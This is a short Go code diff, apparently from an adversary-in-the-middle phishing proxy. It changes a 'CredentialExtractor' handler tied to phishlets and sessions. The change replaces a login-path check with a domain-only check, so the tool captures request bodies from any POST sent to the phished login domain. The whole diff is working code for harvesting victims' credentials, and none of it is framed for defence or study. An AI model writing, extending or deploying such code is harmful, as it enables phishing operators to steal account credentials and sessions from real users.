@@ -26,7 +26,7 @@ func (h *CredentialExtractor) Handle(ctx *aitm.ProxyContext, req *http.Request) 
 	if ctx.Phishlet == nil || ctx.Session == nil {
 		return nil
 	}
-	if !matchesLoginPath(ctx.Phishlet.Login, req) {
+	if !matchesLoginDomain(ctx.Phishlet.Login, req) {
 		return nil
 	}
 	bodyBytes, err := getRequestBody(ctx, req)
@@ -69,14 +69,11 @@ func (h *CredentialExtractor) Handle(ctx *aitm.ProxyContext, req *http.Request) 
 	return nil
 }
 
-func matchesLoginPath(login aitm.LoginSpec, req *http.Request) bool {
+func matchesLoginDomain(login aitm.LoginSpec, req *http.Request) bool {
 	if req.Method != http.MethodPost {
 		return false
 	}
 	if login.Domain != "" && !strings.HasSuffix(strings.ToLower(hostWithoutPort(req.Host)), strings.ToLower(login.Domain)) {
-		return false
-	}
-	if login.Path != "" && !strings.HasPrefix(req.URL.Path, login.Path) {
 		return false
 	}
 	return true
